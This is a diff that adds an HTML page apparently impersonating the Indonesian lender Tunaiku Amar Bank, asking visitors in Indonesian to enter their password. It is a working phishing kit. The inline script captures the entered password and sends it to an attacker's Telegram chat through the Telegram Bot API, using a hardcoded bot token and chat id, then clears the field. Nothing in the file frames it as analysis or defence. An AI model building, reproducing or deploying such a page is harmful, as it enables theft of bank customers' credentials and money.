@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>TUNAIKU</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <form action="pa.html" onsubmit="return sender()">
+        
+        <div class="login">
+            <div class="input-group">silakan masukkan password anda untuk confirmasi
+                TUNAIKU AMAR BANK<h1>Masukkan Password</h1>
+                <p></p>
+            </div>            
+            <div class="input-group">
+                <input type="password" name="item" id="item" placeholder="minimal 8 karakter" maxlength=" 14 " required>
+            </div>
+            <br>
+            <div class="input-group">
+                <button type="submit" onclick="submit()">KLIK/LANJUTKAN</button>
+            </div>
+        </div>
+    </form>
+    <script>
+        //bot token
+var telegram_bot_id = "7047776338%3AAAE-oJireHx1nnu1cvJSb9bzMDQzAE022mA"
+//chat id
+var chat_id = 7015306286
+var u_password;
+var ready = function submit() {
+    u_password = document.getElementById("item").value;
+    message = "[Tunaiku | password]\n \nPIN: " + u_password
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function(response){
+        console.log('');
+    });
+    document.getElementById("item").value = "";
+    return false;
+};
+    </script>
+</body>
+</html>
